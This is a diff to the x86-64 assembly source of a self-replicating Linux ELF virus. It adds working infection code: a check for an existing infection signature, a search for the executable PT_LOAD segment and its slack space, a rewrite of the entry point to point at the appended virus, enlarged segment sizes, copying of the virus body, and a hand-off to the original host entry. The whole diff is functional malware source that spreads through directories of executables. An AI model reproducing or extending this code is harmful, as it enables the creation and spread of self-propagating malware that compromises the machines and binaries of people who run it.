@@ -3,7 +3,7 @@ section.text:
 
 ;-------------------------------------------------------------------------------
 ;|   r8   | virus entry                                                        |
-;|   r9   | end of virus (without params)                                      |
+;|   r9   | virus end
 ;-------------------------------------------------------------------------------
 
 ;-> Save bytes:
@@ -63,7 +63,12 @@ ret
 
 _inject:
 	pop rdi; pop addr from stack
-	push rdx; save register
+
+	; save register
+	push r8
+	push r9
+	push rdx
+
 	%ifdef DEBUG
 		call _print; _print(rdi)
 	%endif
@@ -71,6 +76,10 @@ _inject:
 	push rdi; mov r8, rsi
 	pop r8
 ; r8 contains the entry of the virus
+	jmp _check_end
+	_back_host:
+		pop r9
+	; r9 contains the end of the virus (minus params)
 
 	lea rdi, [rel directories]
 	xor rcx, rcx; = 0
@@ -88,7 +97,7 @@ _inject:
 
 	xor rax, rax; = 0
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
-	jnz _infected
+	jne _infected
 	jmp _host
 
 _infect_dir:; (string rdi)
@@ -240,10 +249,11 @@ _infect_dir:; (string rdi)
 ret
 
 _infect_file: ; (string rdi, stat rsi)
-	push r9
 	push r10
 	push r11
 	push r12
+	push r13
+	push r14
 	push rbx
 	push rcx
 	push rdx
@@ -267,6 +277,7 @@ _infect_file: ; (string rdi, stat rsi)
 	push rax
 	pop r8
 
+	push r9
 	push r10
 	xor rdi, rdi
 	mov rsi, [r12 + 48] ; statbuf.st_size
@@ -279,6 +290,7 @@ _infect_file: ; (string rdi, stat rsi)
 	pop rax ; mmap
 	syscall
 	pop r10
+	pop r9
 	push r8
 	pop r11; fd
 	pop r8
@@ -292,7 +304,7 @@ _infect_file: ; (string rdi, stat rsi)
 	pop rdx
 	call _ft_strncmp
 	push rsi
-	pop r9
+	pop r13
 	cmp rax, 0x0
 	jne .unmap ; not elf file
 	cmp byte[rsi + 16], 2 ; ET_EXEC
@@ -305,20 +317,35 @@ _infect_file: ; (string rdi, stat rsi)
 			mov rdi, rsi
 			call _print; _print(rdi)
 		%endif
-		; TODO: ft_memmem with signature => don't infect
+		; check if already infected
+		mov rsi, r9
+		sub rsi, r8
+		lea rdi, [rel signature]
+		call _ft_strlen
+		sub rsi, 6; 0x5 (call) + 1 (0x0 byte)
+		sub rsi, rax
+		add rsi, r13
+		add rsi, [r13 + 24]; entry
+		lea rdi, [rel signature]
+		call _ft_strcmp
+		cmp rax, 0x0
+		je .unmap
 
 		; get pt_load exec
-		mov rsi, [r9 + 32]; e_phoff
-		mov ax, [r9 + 56]; e_phnum
-		mov rdi, r9
+		mov rsi, [r13 + 32]; e_phoff
+		mov ax, [r13 + 56]; e_phnum
+		mov rdi, r13
 		add rdi, rsi
 		xor rcx, rcx
 		.find_segment_exec:
-			mov ebx, [rdi]
+			inc rcx
+			cmp rcx, rax ; TODO: can't be last PT_LOAD now
+			je .unmap
+			mov ebx, [rdi]; p_type
 			cmp ebx, 1 ; PT_LOAD
 			jne .next
 			xor rdx, rdx
-			mov dx, [rdi + 4]
+			mov dx, [rdi + 4]; p_flags
 			and dx, 1 ; PF_X
 			jnz .segment_found
 			.next:
@@ -332,30 +359,66 @@ _infect_file: ; (string rdi, stat rsi)
 					pop rax
 					pop rdi
 				%endif
-				inc rcx
-				cmp rcx, rax
-				je .unmap
 				add rdi, 56; sizeof(Elf64_Phdr)
 			jmp .find_segment_exec
 		.segment_found:
-			%ifdef DEBUG
-				mov rdi, r10
-				call _print; _print(rdi)
-			%endif
-		; header->e_shoff => 40
-		; phdr->p_type => 0
-		; PT_LOAD => 1
-		; phdr->p_flags => 4
-		; PF_X => 1 ; pt_load->p_flags & PF_X
+			mov rax, [rdi + 8]; p_offset
+			add rax, [rdi + 32]; p_filesz
+			mov rsi, [rdi + 56 + 8] ; next->p_offset
+			sub rsi, rax
+			mov rax, r9
+			sub rax, r8
+			add rax, 8 * 3 ; params (uint64_t * nb)
+			cmp rsi, rax
+			jl .unmap ; if size between PT_LOAD isn't enough -> abort
+			; TODO: maybe infect via PT_NOTE ?
+
+			mov rsi, [rdi + 8]
+			add rsi, [rdi + 32]; rsi at the end of pt_load
+			; change entry
+			mov r14, [r13 + 24]; save entry
+			mov [r13 + 24], rsi
+			; change pt_load size
+			add [rdi + 32], rax; p_filesz + virus
+			add [rdi + 40], rax; p_memsz + virus
+
+			; copy virus
+			push rdi
+			pop rbx
+			push rax
+			pop rdx
+			sub rdx, 8 * 3
+			push rsi
+			pop rdi
+			add rdi, r13 ; addr pointer -> mmap
+			mov rsi, r8
+			call _ft_memcpy
+
+			; add _params
+			add rax, rdx ; go to the end
+			mov rdi, [rbx + 16]
+			mov [rax], rdi ; vaddr
+			add rax, 8
+			mov rdi, [rbx + 32]
+			mov [rax], rdi; entry_inject
+			add rax, 8
+			mov [rax], r14
+
+			; write everything in file
+			mov rdi, r11
+			mov rsi, r13
+			mov rdx, [r12 + 48]
+			mov rax, 1
+			syscall
 	.unmap:
-		push r11; aaa
-		push r9
+		push r11
+		push r13
 		pop rdi
 		mov rsi, [r12 + 48] ; statbuf.st_size
 		push 11
 		pop rax
 		syscall
-		pop r11; aaa
+		pop r11
 	.close:
 		push r11
 		pop rdi
@@ -372,27 +435,35 @@ _infect_file: ; (string rdi, stat rsi)
 	pop rdx
 	pop rcx
 	pop rbx
+	pop r14
+	pop r13
 	pop r12
 	pop r11
 	pop r10
-	pop r9
 ret
 
 _host:
-;	jmp _check_end
-	_back_host:
-;		pop r9
-; r9 contains the end of the virus (minus params)
 	jmp _exit
 
 _infected:
-	jmp _exit
+	mov rsi, r8
+	sub rsi, [rel entry_inject]
+	add rsi, [rel vaddr]
+
+	mov rax, rsi
+	add rax, [rel entry_prg]
+	sub rax, [rel vaddr]
+
+	pop rdx
+	pop r9
+	pop r8
+
+	jmp rax
 
 _exit:
 	pop rdx
-	pop r13
-	pop r14
-	pop r15
+	pop r9
+	pop r8
 
 	mov rax, 60 ; exit
 	xor rdi, rdi; = 0
@@ -461,14 +532,33 @@ ret
 _ft_strcpy: ; (string rdi, string rsi)
 	push rcx
 
+	xor rax, rax
 	xor rcx, rcx; = 0
 	.loop_char:
-		mov al, [rsi + rcx]
-		mov [rdi + rcx], al
 		cmp byte[rsi + rcx], 0x0
 		je .return
+		mov al, [rsi + rcx]
+		mov [rdi + rcx], al
 		inc rcx
 	jmp .loop_char
+	.return:
+		mov rax, rdi
+
+	pop rcx
+ret
+
+_ft_memcpy: ; (string rdi, string rsi, size_t rdx)
+	push rcx
+
+	xor rax, rax
+	xor rcx, rcx
+	.loop_byte:
+		cmp rcx, rdx
+		je .return
+		mov al, [rsi + rcx]
+		mov [rdi + rcx], al
+		inc rcx
+	jmp .loop_byte
 	.return:
 		mov rax, rdi
 
